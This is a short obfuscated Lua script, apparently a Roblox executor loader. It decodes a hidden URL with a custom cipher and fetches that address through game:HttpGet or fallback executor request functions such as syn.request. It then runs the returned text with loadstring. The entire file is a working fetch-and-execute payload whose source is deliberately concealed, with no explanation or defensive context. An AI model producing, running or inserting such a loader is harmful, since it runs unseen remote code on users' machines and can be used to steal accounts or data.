local function _d(t,k)local r={}for i=1,#t do r[i]=string.char(((t[i]-k-(i*19)-41)%256+256)%256)end return table.concat(r)end
local _u=_d({59,90,109,124,146,108,116,135,222,236,242,15,28,46,62,99,107,120,152,157,193,198,163,248,252,39,45,60,73,108,124,143,97,189,200,222,234,247,23,43,249,66,86,122,70,160,111,127,208},151)
local _f=(loadstring or load)
local _ok,_s=pcall(function()return game:HttpGet(_u,true)end)
if not _ok or type(_s)~="string" or #_s<8 then local _r=(getgenv and (getgenv().http_request or getgenv().request))or http_request or request or (syn and syn.request) if _r then local _x=_r({Url=_u,Method="GET"}) _s=_x and (_x.Body or _x.body) end end
if _f and type(_s)=="string" and #_s>0 then return _f(_s)() end
